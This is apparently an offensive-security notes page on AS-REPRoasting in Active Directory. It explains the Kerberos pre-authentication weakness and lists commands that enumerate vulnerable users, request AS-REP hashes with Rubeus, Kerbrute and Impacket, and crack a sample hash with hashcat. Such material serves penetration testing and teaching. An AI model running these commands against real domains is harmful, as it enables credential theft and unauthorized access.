# AS-REPRoasting

## Overview

It's possible to obtain the Ticket Granting Ticket (TGT) for any account that has the Do not require Kerberos pre-authentication setting enabled. Many vendor installation guides specify that their service account be configured in this way. The authentication service reply (AS_REP) is encrypted with the account’s password, and any domain user can request it.

With pre-authentication, a user enters their password, which encrypts a time stamp. The Domain Controller will decrypt this to validate that the correct password was used. If successful, a TGT will be issued to the user for further authentication requests in the domain. If an account has pre-authentication disabled, an attacker can request authentication data for the affected account and retrieve an encrypted TGT from the Domain Controller. This can be subjected to an offline password attack using a tool such as Hashcat or John the Ripper.

AS-REPRoasting is similar to Kerberoasting, but it involves attacking the AS-REP instead of the TGS-REP. An SPN is not required. This setting can be enumerated with PowerView or built-in tools such as the PowerShell AD module.

The attack itself can be performed with the Rubeus toolkit and other tools to obtain the ticket for the target account. If an attacker has GenericWrite or GenericAll permissions over an account, they can enable this attribute and obtain the AS-REP ticket for offline cracking to recover the account's password before disabling the attribute again. Like Kerberoasting, the success of this attack depends on the account having a relatively weak password.

## Attack Requirements

- Username of an account with the Do not require Kerberos pre-authentication setting

## Attack Results

An encrypted TGT. We can attempt to crack it offline

## Attack Execution

### Searching for Users with Do not require Kerberos pre-authentication setting

Check if users in the domain that have the pre authentication not required:

    Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl

### With Rubeus

```
.\Rubeus.exe asreproast /user:<domain_username> /nowrap /format:hashcat
```

### With Kerbrute

When performing user enumeration with Kerbrute, the tool will automatically retrieve the AS-REP for any users found that do not require Kerberos pre-authentication.

    kerbrute userenum -d <domain_name> --dc <domain_controller_ip> <domain_usernames_list>.txt
    kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt

### With Impacket

```
GetNPUsers.py <domain_name>/ -dc-ip <domain_controller_ip> -no-pass -usersfile <domain_usernames_list>.txt
```

### Cracking the Hash

We can the crack the hash with hashcat:

    hashcat -m18200 '$krb5asrep$23$spot@offense.local:3171EA207B3A6FDAEE52BA247C20362E$56FE7DC0CABA8CB7D3A02A140C612A917DF3343C01BCDAB0B669EFA15B29B2AEBBFED2B4F3368A897B833A6B95D5C2F1C2477121C8F5E005AA2A588C5AE72AADFCBF1AEDD8B7AC2F2E94E94CB101E27A2E9906E8646919815D90B4186367B6D5072AB9EDD0D7B85519FBE33997B3D3B378340E3F64CAA92595523B0AD8DC8E0ABE69DDA178D8BA487D3632A52BE7FF4E786F4C271172797DCBBDED86020405B014278D5556D8382A655A6DB1787DBE949B412756C43841C601CE5F21A36A0536CFED53C913C3620062FDF5B18259EA35DE2B90C403FBADD185C0F54B8D0249972903CA8FF5951A866FC70379B9DA' -a 3 /usr/share/wordlists/rockyou.txt
